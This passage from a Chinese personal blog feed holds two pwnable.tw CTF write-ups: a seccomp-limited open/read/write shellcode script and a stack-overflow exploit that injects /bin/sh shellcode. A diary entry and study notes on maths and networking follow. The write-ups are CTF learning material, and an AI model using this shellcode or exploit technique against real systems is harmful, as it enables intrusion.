<span class="token macro property">#<span class="token directive keyword">define</span> __NR_open 5</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>也就是我们能用<code>read</code>, <code>write</code> 和 <code>open</code>….<br>然后这个时候, dalao和我说…人家题目上告诉你用这三个system call了…血崩…我是一个没看题的智障</p>
<p>后来发现了一个工具<code>seccomp-tools</code></p>
<pre><code>// 安装
gem install seccomp-tools
// 使用
seccomp-tools dump ./orw
</code></pre><p>就可以得到</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"> line  CODE  JT   JF      K
<span class="token operator">===</span><span class="token operator">===</span><span class="token operator">===</span><span class="token operator">===</span><span class="token operator">===</span><span class="token operator">===</span><span class="token operator">===</span><span class="token operator">===</span><span class="token operator">===</span><span class="token operator">===</span><span class="token operator">===</span>
 <span class="token number">0000</span><span class="token punctuation">:</span> <span class="token number">0x20</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000004</span>  A <span class="token operator">=</span> arch
 <span class="token number">0001</span><span class="token punctuation">:</span> <span class="token number">0x15</span> <span class="token number">0x00</span> <span class="token number">0x09</span> <span class="token number">0x40000003</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> ARCH_I386<span class="token punctuation">)</span> goto <span class="token number">0011</span>
 <span class="token number">0002</span><span class="token punctuation">:</span> <span class="token number">0x20</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00000000</span>  A <span class="token operator">=</span> sys_number
 <span class="token number">0003</span><span class="token punctuation">:</span> <span class="token number">0x15</span> <span class="token number">0x07</span> <span class="token number">0x00</span> <span class="token number">0x000000ad</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> rt_sigreturn<span class="token punctuation">)</span> goto <span class="token number">0011</span>
 <span class="token number">0004</span><span class="token punctuation">:</span> <span class="token number">0x15</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00000077</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> sigreturn<span class="token punctuation">)</span> goto <span class="token number">0011</span>
 <span class="token number">0005</span><span class="token punctuation">:</span> <span class="token number">0x15</span> <span class="token number">0x05</span> <span class="token number">0x00</span> <span class="token number">0x000000fc</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> exit_group<span class="token punctuation">)</span> goto <span class="token number">0011</span>
 <span class="token number">0006</span><span class="token punctuation">:</span> <span class="token number">0x15</span> <span class="token number">0x04</span> <span class="token number">0x00</span> <span class="token number">0x00000001</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> exit<span class="token punctuation">)</span> goto <span class="token number">0011</span>
 <span class="token number">0007</span><span class="token punctuation">:</span> <span class="token number">0x15</span> <span class="token number">0x03</span> <span class="token number">0x00</span> <span class="token number">0x00000005</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> open<span class="token punctuation">)</span> goto <span class="token number">0011</span>
 <span class="token number">0008</span><span class="token punctuation">:</span> <span class="token number">0x15</span> <span class="token number">0x02</span> <span class="token number">0x00</span> <span class="token number">0x00000003</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> read<span class="token punctuation">)</span> goto <span class="token number">0011</span>
 <span class="token number">0009</span><span class="token punctuation">:</span> <span class="token number">0x15</span> <span class="token number">0x01</span> <span class="token number">0x00</span> <span class="token number">0x00000004</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> write<span class="token punctuation">)</span> goto <span class="token number">0011</span>
 <span class="token number">0010</span><span class="token punctuation">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x00050026</span>  <span class="token keyword">return</span> <span class="token function">ERRNO</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">)</span>
 <span class="token number">0011</span><span class="token punctuation">:</span> <span class="token number">0x06</span> <span class="token number">0x00</span> <span class="token number">0x00</span> <span class="token number">0x7fff0000</span>  <span class="token keyword">return</span> ALLOW
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>就不需要人肉解读了….</p>
<blockquote>
<p>除了用prctl也可以用prctl的system call来进入这个模式</p>
</blockquote>
<p>所以, 下面是</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"chall.pwnable.tw"</span><span class="token punctuation">,</span> <span class="token number">10001</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># read -> open -> read -> write</span>
shellcode <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
mov eax, 0x03
xor ebx, ebx
mov ecx, esp
mov edx, 0x10
int 0x80

mov eax, 0x05
mov ebx, esp
xor ecx, ecx
xor edx, edx
int 0x80

mov ebx, eax 
mov eax, 0x03
mov ecx, esp
mov edx, 0x30
int 0x80

mov eax, 0x04
mov ebx, 1
mov ecx, esp
mov edx, 0x30
int 0x80
'''</span>

shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>

raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"/home/orw/flag"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[pwnable.tw start]]></title>
      <url>/2017/10/15/pwnable-tw-start/</url>
      <content type="html"><![CDATA[<p>小巧的文件, 只有两个函数, <code>_start</code>和<code>_exit</code></p>
<pre class="line-numbers language-asm"><code class="language-asm">.text:08048060                 public _start
.text:08048060 _start          proc near
.text:08048060                 push    esp
.text:08048061                 push    offset _exit
.text:08048066                 xor     eax, eax
.text:08048068                 xor     ebx, ebx
.text:0804806A                 xor     ecx, ecx
.text:0804806C                 xor     edx, edx
.text:0804806E                 push    3A465443h
.text:08048073                 push    20656874h
.text:08048078                 push    20747261h
.text:0804807D                 push    74732073h
.text:08048082                 push    2774654Ch
.text:08048087                 mov     ecx, esp        ; addr
.text:08048089                 mov     dl, 14h         ; len
.text:0804808B                 mov     bl, 1           ; fd
.text:0804808D                 mov     al, 4
.text:0804808F                 int     80h             ; LINUX - sys_write
.text:08048091                 xor     ebx, ebx
.text:08048093                 mov     dl, 3Ch
.text:08048095                 mov     al, 3
.text:08048097                 int     80h             ; LINUX -
.text:08048099                 add     esp, 14h
.text:0804809C                 retn
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>相当于是先<code>push</code>了20字节<br>然后打印栈顶起20字节内容<br>之后向栈顶写入60字节内容<br>栈顶<code>add esp, 20</code><br>返回</p>
<p>典型的栈溢出, 检查未开保护, 所以可以在栈上写好shellcode, 然后跳过去, 前提要先泄露出栈顶地址</p>
<p>我们在第一次ret之后, 刚好栈顶是之前save的一个<code>esp</code>[和当前esp相差4字节], 这个时候跳到<code>0x8048087</code>这里, 就可以泄露出一个栈上的一个地址</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment" spellcheck="true"># s = remote("chall.pwnable.tw", 10000)</span>
s <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./start"</span><span class="token punctuation">)</span>

leak_func <span class="token operator">=</span> <span class="token number">0x8048087</span>

<span class="token comment" spellcheck="true"># shellcode = asm(shellcraft.i386.sh()) // 44-bytes, too long</span>
shellcode <span class="token operator">=</span> <span class="token string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'</span> <span class="token comment" spellcheck="true"># 24-bytes</span>

payload1 <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">20</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>leak_func<span class="token punctuation">)</span>

s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
stack_addr <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">"[*] stack_addr is %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>hex<span class="token punctuation">(</span>u32<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

payload2 <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">20</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token punctuation">(</span>u32<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> shellcode <span class="token comment" spellcheck="true"># must &lt;= 60 bytes, for read 60bytes</span>
s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>

s<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>要注意的点在于这里用的shellcode不能太长, 因为只能写入60字节, junk占20字节, 返回地址占4字节, 就剩36字节, 而pwntools自带的shellcode有44字节</p>
<p>好好学习, 天天向上</p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2017国庆记]]></title>
      <url>/2017/10/03/2017%E5%9B%BD%E5%BA%86%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h2 id="前些天"><a href="#前些天" class="headerlink" title="前些天"></a>前些天</h2><p>九月过得好心累<br>9.15 信工所复试通知一出,没有我…感觉超级伤心=_+, 这个时候才开始看其他学校, 其实可以去试一下的…QAQ, 当时感觉北京好远???mdzz</p>
<p>9.16 去南大软院霸面, 老师好像对网络安全不太感兴趣, 介绍完参加的比赛, 项目, 老师也没提出什么问题就让我走了, GG, 后来看了下软院的方向好像都没有安全相关, 当然自己的学校和排名可能直接挂掉了, 前面名单上都是985学校的QAQ</p>
<p>9.25 东南大学复试, 网络空间安全, 今年东南招两批, 我这个第二批无笔试, 有点紧张, 面试分a组, b组, 我分到a组, 在门口等候面试的时候, 出来一个学姐, 告诉我们一会儿自我介绍可以中文, 可以英文, 不影响你们成绩的, 英语渣突然就不紧张了, 进去之后, 中文介绍来一下, 问了校区的事情, 如实回答, 问了我为啥没过六级, 然后就聊了聊比赛, 依稀记得有问到加壳, 花指令, xss…但问的不深, 好像还算满意</p>
<p>9.27 东南出了结果, 本来想就这样子定了, 然后收到了北邮的短信, 考虑了半天, 下午高铁到了北京…(我是多么智障…还是来北京了,而且南大也是霸面的…为什么没有去信工所试一下QAQ), 半夜1点多到了住处, 是汪老师订好的, 在北邮附近, 160一晚感觉挺便宜的, 比较晚, 妈妈在家其实很担心= =</p>
<p>9.28 9点面试, 汪老师8.30面试所以比我早些出门了, 我起来去打印了简历就去科研楼9楼等复试了, 大概12个人…问了下周围几个人…都是早就联系好老师的QAQ, 传说中来走一下流程, 当时就慌了…后来想想没事, 反正大家都是来走流程的, 我是来面试的, 那我还紧张啥, 就当旅游了…进去之后, 问了比赛, 然后问了堆的比较多…也不太深…然后问我研究生准备做哪个方向, 就让我走了, 面完准备去旅游…然后接到电话说我过了, 说表现不错, 给我个学硕……思考了一中午, 弃了北邮, 回到宾馆约了高中的同学…一桌上5个人, 两个是高考进北邮的, 两个是保研放弃东南到北邮的, 只有我…要走了QAQ, 当时感觉怪怪的, 有些忧伤…之后一起吃饭随便聊了聊, 很新认识的朋友去了北师大逛kan逛mei校zi园, 没有什么惊喜QAQ, 大概妹子都在教室里学习吧</p>
<p>9.29 起床, 和汪老师一起离开, 他直接北京回了安徽, 我从北京到天津, 中间还误了一趟车…真是, 本来准备看看在天大的朋友, 然而他..生病了…就自己在火车站周围逛逛, 去看了看意大利风情街…满街的小情侣[气哭.jpg]</p>
<p>9.30 一早回家, 晚上到家</p>
<h2 id="这几天"><a href="#这几天" class="headerlink" title="这几天"></a>这几天</h2><p>10.1 - 10.4 在家吃, 睡, 玩<br>10.5 回学校QAQ, 一天在车上<br>10.6 回学校QAQ, 太远了, 快中午才到</p>
<h2 id="后续的打算"><a href="#后续的打算" class="headerlink" title="后续的打算"></a>后续的打算</h2><p>想看看张的软件调试<br>重装系统, 安装个安卓环境<br>还是主web和pwn, 刷题<br>把买的几本书看完<br>打好下面两场线下, 积累积累<br>即便不再参加算法竞赛, 也想捡起来<br>QAQ</p>
]]></content>
      
        <categories>
            
            <category> 日记 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 回忆 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[离散数学复习]]></title>
      <url>/2017/09/06/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6%E5%A4%8D%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p>内容大概有, 集合论, 关系理论, 图论, 排列组合, 近世代数</p>
<h2 id="集合论"><a href="#集合论" class="headerlink" title="集合论"></a>集合论</h2><p>集合: 无序, 互异, 确定</p>
<h3 id="集合间的关系"><a href="#集合间的关系" class="headerlink" title="集合间的关系"></a>集合间的关系</h3><ol>
<li>被包含关系(子集)<br>性质:</li>
</ol>
<ul>
<li>自反性, 任何集合A, 都有A是A的子集 (mathjax还是用不了, 气的昏古七…)</li>
<li>传递</li>
<li>反对称, 若A是B的子集, B是A的子集, 那么A = B</li>
</ul>
<ol>
<li>相等关系<br>性质</li>
</ol>
<ul>
<li>自反性</li>
<li>传递性</li>
<li>对称性</li>
</ul>
<ol>
<li>真包含<br>性质</li>
</ol>
<ul>
<li>传递性</li>
</ul>
<h3 id="特殊集合"><a href="#特殊集合" class="headerlink" title="特殊集合"></a>特殊集合</h3><ol>
<li><p>全集<br>全集就是论域</p>
</li>
<li><p>空集</p>
</li>
</ol>
<ul>
<li>对于任何集合A, 都有空集是A的子集</li>
<li>空集是唯一的</li>
</ul>
<ol>
<li>幂集<br>由A的所有<code>子集</code>构成的<code>集合</code>, 称之为A的<code>幂集</code>, 记为<code>P(A)</code>或者<code>2^A</code><br>例如, <code>{a, b}</code>的幂集是<code>{空集, {a}, {b}, {a, b}}</code><br>集合中元素的个数称作是集合的基数, 记为<code>|A|</code><br>对于给定集合A, 如果<code>|A| = n</code>, 则<code>|P(A)| = 2^n</code><br>幂集元素编码…这个其实很显然但也很有用</li>
</ol>
<h3 id="无限集合"><a href="#无限集合" class="headerlink" title="无限集合"></a>无限集合</h3><p>等势(~), A, B两个集合, 若在A, B之间存在一一对应的关系, 则称A, B是等势的<br>若A,B相等, 那么A, B等势…反之不成立</p>
<p>与自然数集合等势的集合，统称<code>可数集合</code><br>开区间(0,1)称为不可数集合, 和它等势的都是<code>不可数集合</code></p>
<h2 id="计数问题"><a href="#计数问题" class="headerlink" title="计数问题"></a>计数问题</h2><h3 id="排列组合"><a href="#排列组合" class="headerlink" title="排列组合"></a>排列组合</h3><h3 id="鸽巢原理"><a href="#鸽巢原理" class="headerlink" title="鸽巢原理"></a>鸽巢原理</h3><h3 id="容斥原理"><a href="#容斥原理" class="headerlink" title="容斥原理"></a>容斥原理</h3><p>加法原理算是容斥的特殊情况, 加法原理里涉及到的集合之间是没有交集的…如果有交集, 那这个时候就要用到容斥原理了</p>
<h3 id="计数原理-生产函数"><a href="#计数原理-生产函数" class="headerlink" title="计数原理(生产函数)"></a>计数原理(生产函数)</h3><p>给定一个数列a0, a1, …, ak,….<br>设计一个函数<code>G(x) = \sum_{k=0}a_k * x^k</code><br>就像是进制表示的感觉..~</p>
<p>感觉这个比较厉害…</p>
<p>例子<br>有4只不同颜色 (红，黄，蓝，绿)的球，允许在4只球中重复取出r次，并且要求满足：其中的红球至多取到2次、黄球至多取到3次、蓝球和绿球都至多取到1次, 问有多少种取法…?</p>
<p>取不同颜色的球, 积事件<br>取同一颜色的球, 或者不取或者逐渐增加至上限值, 和事件</p>
<p>所以<br>用多项式(1+x+x^2)来表示最多取到两次红球事件…其他类似</p>
<p>则</p>
<pre><code>G(x) = (1 + x + x^2) * (1 + x + x^2 + x^3) * (1 + x) * (1 + x)
     = 1 + 4x + 8x^2 + 11x^3 + 8x^5 + 4x^6 + x^7
</code></pre><p>X^6的系数4代表的是…选6次…满足条件的选法有4种..恩, 我觉得OK</p>
<h2 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h2><p>关系就是有序元祖的集合..</p>
<p>序偶: 由两个对象(但并不一定是简单元素) x 和 y组成的序列叫做序偶</p>
<p>有序n元组: <code>&lt;&lt;x1, x2, x3, ..., xn-1&gt;, xn&gt;</code>叫做有序n元组, 第一个元素是一个有序n-1元祖<br>并且能够简单记为<code>&lt;x1, x2, x3, ..., xn&gt;</code></p>
<p>笛卡尔积: 记为<code>X</code></p>
<ul>
<li>笛卡尔积满足结合律, 不满足交换律</li>
<li>笛卡尔积对于交和并满足那个分配律</li>
</ul>
<p>约定 A1 X A2 X A3 = (A1 X A2) X A3<br>A1 X A2 X A3  X A4 = (A1 X A2 X A3 ) X A4 = ((A1 X A2) X A3)  X A4</p>
<p>另外有 A X A X A…A = A^n</p>
<p>n元关系算是n元的笛卡尔积的一个…子集…?</p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>函数是一种特殊的关系<br>一个关系要称为函数, 需要满足</p>
<ul>
<li>dom(f) = A<br>对于任意的<code>x</code>属于<code>A</code>, 存在<code>y</code>属于<code>B</code>, 使得<code>f(x) = y</code></li>
<li>单值性<br>若<code>f(x) = y1</code>, <code>f(x) = y2</code>, 则<code>y1 = y2</code></li>
</ul>
<p>函数与一般的关系相比, 有如下的差别:</p>
<ol>
<li>从A到B的关系有<code>2 ^ (|A| * |B|)</code>个,但A到B的函数只有<code>|B| ^ |A|</code>个</li>
<li>关系中序偶的第一个元素可以相同, 而函数则不可以</li>
<li>每个函数的基数都是<code>|A|</code>个(<code>|f| = |A|</code>), 但关系的基数是从零一直到<code>|A| * |B|</code></li>
</ol>
<p>也就是说, 序偶中的第一个元素就是出现一次的自变量, 对于每个自变量有<code>|B|</code>种取值, 所以有<code>|B| * |B| * ...</code>共有<code>|A|</code>相乘. 所以就是<code>|B| ^ |A|</code></p>
<p>也就是说..定义域一定等于<code>A</code>, 但值域不一定等于<code>B</code>, 对吧…值域是B的子集</p>
<p>函数相等条件是<br>定义域相等, <del>值域相等</del> 是B相等, 对应关系相等</p>
<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><ol>
<li><p>对于一个函数, 若<code>A = B</code>…而且对于所有的x, 都有<code>f(x) = x</code>, 则叫做恒等函数I_A</p>
</li>
<li><p>存在b属于B, 对于所有的x属于A, 都有<code>f(x) = b</code>, 则称f为常值函数</p>
</li>
<li><p>对实数x, f(x)为大于等于x的最小的整数, 则称f(x)为上取整函数, 写法是写个顶</p>
</li>
<li><p>对实数x, f(x)为小于等于x的最小的整数, 则称f(x)为下取整函数, 写法是写个底…这个下取整其实更常用</p>
</li>
</ol>
<h3 id="函数运算"><a href="#函数运算" class="headerlink" title="函数运算"></a>函数运算</h3><h2 id="代数系统"><a href="#代数系统" class="headerlink" title="代数系统"></a>代数系统</h2><p>这个比较复杂, 计划一下是否继续复习</p>
]]></content>
      
        <categories>
            
            <category> 备忘 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[概率论复习]]></title>
      <url>/2017/09/06/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%A4%8D%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p>这个没有mathjax感觉没办法记笔记啊==<br>忧伤..就这样子将就吧</p>
<h2 id="随机事件"><a href="#随机事件" class="headerlink" title="随机事件"></a>随机事件</h2><p>A - B 的意思是 A发生, B不发生</p>
<p>AB = 空集, A + B = 全集, 这就是A和B是互逆, 或者对立<br>对立一定互斥, 互斥不一定对立</p>
<p>事件遵循那个</p>
<ol>
<li><p>交换律</p>
</li>
<li><p>结合律</p>
</li>
<li><p>分配律<br>交对并有分配, 并对交也有分配</p>
</li>
<li><p>对偶原理<br>形式上看起来像是德摩根律, 相当于把非分配出来</p>
</li>
</ol>
<h3 id="古典概型"><a href="#古典概型" class="headerlink" title="古典概型"></a>古典概型</h3><p>主要强调计数</p>
<p>超几何概型<br>产品抽样检查中经常遇到一类实际问题，假定在N件产品中有M件不合格品<br>早产品中抽取n件做检查, 发现k检不合格品的概率为<br>P(X = k) = (C<em>M^k * C</em>{N-M}^{n - k}) / (C_N^n)<br>不要把分母给丢掉呀</p>
<h3 id="几何概型"><a href="#几何概型" class="headerlink" title="几何概型"></a>几何概型</h3><h3 id="频率"><a href="#频率" class="headerlink" title="频率"></a>频率</h3><p>随着试验次数的无限增大, 事件的频率逐渐稳定与某个常数<br>事件A发生的频率的稳定值被称为A的统计概率</p>
<h3 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h3><p>减法公式 P(A - B) = P(A) - P(AB)<br>加法公式 P(A + B) = P(A) + P(B) - P(AB) (这不就是容斥原理)</p>
<p>条件概率<br>P(B | A) = P(AB) / P(A)<br>所以P(B) = P(B | omiga) 也可以看成条件概率…omiga是全集</p>
<p>条件概率也满足加法公式<br>P((B + C) | A) = P(B | A) + P(C | A) - P(BC | A)</p>
<p>注意: 加就是并…乘就是交</p>
<p><em>把条件概率定义倒过来就得到一个</em><br>P(AB) = P(A) <em> P(B | A) = P(B) </em> P(A | B)</p>
<p>并且可以推广到多个事件<br>P(ABC) = P(AB) <em> P(AB | C) = P(A) </em> P(B | A) <em> P(AB | C)<br>P(A1 A2 A3…An) = P(A1) </em> P(A2 | A1) <em> P(A3 | A1A2) </em> … P(An | A1A2…An-1)</p>
<h3 id="全概率公式和贝叶斯"><a href="#全概率公式和贝叶斯" class="headerlink" title="全概率公式和贝叶斯"></a>全概率公式和贝叶斯</h3><p>划分/ 完备事件组 两两互斥, 并起来是全集的一组事件</p>
<p>设试验E的样本空间是omiga, B1, B2, …Bn是omiga的一个划分, P(Bi) &gt; 0, i = 1,2…n<br>则称 P(A) = \sum {P(A Bj)} = \sum {P(Bj) * P(A | Bj)} 为全概率事件</p>
<p>因为这个Bj互斥, 所以A * Bj 之间也互斥..所以这样子就等效过来了</p>
<p>贝叶斯公式<br>P(Bi | A) = P(Bi <em> A) / P(A) = {P(Bi) </em> P(A | Bi)} / {\sum {P(Bi) * P(A | Bi)}}</p>
<h3 id="事件独立性"><a href="#事件独立性" class="headerlink" title="事件独立性"></a>事件独立性</h3><p>如果满足 P(AB) = P(A) <em> P(B) 的话…那么AB相互独立<br>如果..AB独立, 那…P(AB) = P(A) </em> P(B | A) = P(A) <em> P(A | B) = P(A) </em> P(B)<br>所以也就是说, 有P(A) = P(A | B)和 P(B) = P(B | A)</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[问题积累]]></title>
      <url>/2017/09/06/%E9%97%AE%E9%A2%98%E7%A7%AF%E7%B4%AF/</url>
      <content type="html"><![CDATA[<p>在网上看到的面试问题积累下来…过段时间面试没准遇到一样的</p>
<ol>
<li><p>虚函数的功能，构造函数是否是虚函数</p>
</li>
<li><p>要求第k大的数用哪种排序算法，怎么优化</p>
</li>
<li><p>对网络攻防的看法</p>
</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[计算机网络复习]]></title>
      <url>/2017/09/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%A4%8D%E4%B9%A0/</url>
      <content type="html"><![CDATA[<h2 id="概论"><a href="#概论" class="headerlink" title="概论"></a>概论</h2><p>发展:</p>
<ul>
<li>远程联机系统</li>
<li>计算机-计算机网络 以资源共享为目标</li>
<li>开放式标准化网络</li>
</ul>
<p>分类</p>
<ol>
<li>按照大小</li>
</ol>
<ul>
<li>局域网</li>
<li>城域网</li>
<li>广域网</li>
</ul>
<ol>
<li>按照拓扑结构</li>
</ol>
<ul>
<li>星形网, 通过中心节点连接其他节点, 信息交换需要经过中心节点, 中心节点GG整个系统GG</li>
<li>环形网, 所有节点形成一个闭环, 信息交换要沿着环, 任意一个节点GG就GG</li>
<li>总线网络, 所有节点都连在总线上, 任何节点发送数据其他节点都能收到, 任何节点坏了都不影响</li>
<li><p>不规则网络, 每个节点和至少两个节点连接, 可靠型好, 较少节点出现故障不影响大局 </p>
</li>
<li><p>局域网</p>
<ul>
<li>总线型, 星型, 环形</li>
</ul>
</li>
<li>广域网<ul>
<li>不规则型</li>
</ul>
</li>
<li>点对点: 独占<ul>
<li>星型, 不规则型</li>
</ul>
</li>
<li>多点通信: 共享<ul>
<li>总线型, 环型</li>
</ul>
</li>
</ul>
<ol>
<li>按数据交换方式</li>
</ol>
<ul>
<li>电路交换</li>
<li>分组交换</li>
<li>信元交换</li>
</ul>
<p>概念;</p>
<ul>
<li>通信子网: 由路由器和通信线路组成, 完成网络通信任务</li>
<li>资源子网: 由连接到通信子网的服务器和主机系统组成, 就是一些终端设备…包括硬件资源和软件资源<ul>
<li>硬件资源<br>CPU, 存储器, 硬盘等等</li>
<li>软件资源<br>操作系统, 数据库系统, 工具软件, 应用程序</li>
</ul>
</li>
<li>计算机网络: 将若干台具有独立功能的计算机系统，用某种或多种通信介质连接起来，通过完善的网络协议，在数据交换的基础上，实现网络资源共享的系统称为计算机网络。</li>
</ul>
<h2 id="网络协议"><a href="#网络协议" class="headerlink" title="网络协议"></a>网络协议</h2><p>约定好的一整套通信规程，包括规定要交换的数据格式、控制信息的格式和控制功能、通信过程中事件执行的次序等。这些通信规程称之为网络协议。</p>
<p>我们将计算机网络分层, 然后每一层都有一个特定的协议来描述功能的实现</p>
<p>相同的层通过协议来保证正常通信, 不同的层, 底层给高层提供服务</p>
<h3 id="OSI参考模型"><a href="#OSI参考模型" class="headerlink" title="OSI参考模型"></a>OSI参考模型</h3><p>分为7层, 从低层到高层</p>
<ul>
<li>物理层</li>
<li>数据链路层</li>
<li>网络层</li>
<li>传输层</li>
<li>会话层</li>
<li>表示层</li>
<li>应用层</li>
</ul>
<p>其中的会话层, 表示层…定义是这样子的, 但我确实没有在意过这个<br>会话层: 进行会话管理, 包括通信方向控制, 故障点恢复<br>表示层: 数据转化, 数据加解密</p>
<blockquote>
<p>另外, 靠下的四层, 是这个负责通信, 5-7是负责数据处理</p>
</blockquote>
<p>因为这个OSI参考模型是那种教科书式的模型, 其实未被使用过, 只是一个参考, 真正使用到的是Internet参考模型</p>
<h3 id="Internet参考模型"><a href="#Internet参考模型" class="headerlink" title="Internet参考模型"></a>Internet参考模型</h3><ul>
<li>子网层<ul>
<li>物理层</li>
<li>数据链路层</li>
</ul>
</li>
<li>网络层</li>
<li>传输层</li>
<li>应用层</li>
</ul>
<p>相当于是5层结构, 这个很常用</p>
<h2 id="数据通信基础"><a href="#数据通信基础" class="headerlink" title="数据通信基础"></a>数据通信基础</h2><p>模型构成</p>
<pre><code>信源 - 变换器 - 信道 - 反变换器 - 信宿
</code></pre><p>信源: 把各种信息转化成原始物理信号<br>变换器: 把原始物理信号进行变换, 以便与在信道上传输<br>噪声源: 信道自身的噪声以及周围环境对信道的干扰</p>
<p>下面两个概念对比</p>
<ul>
<li>信号带宽: 信号能量所集中的频率范围, 记为<code>H = f_max - f_min</code>, f为频率<br>对于数字信号, 带宽H可以近似表示为<code>H = 1 / t</code>, t 为脉冲宽度…这个没懂</li>
<li>信道带宽: 信道允许传输信号的频率范围, 单位是Hz, 对于数字通信, 通常用数据率表示带宽</li>
</ul>
<p>信道数据率(容量): 信道每秒最多传输的二进制位数, 单位bps</p>
<p>衡量信道质量的两个重要参数</p>
<ul>
<li>信道带宽</li>
<li>信道的误码率</li>
</ul>
<p>信道带宽和数据率的关系:<br>奈奎斯特定理(无噪声信道)</p>
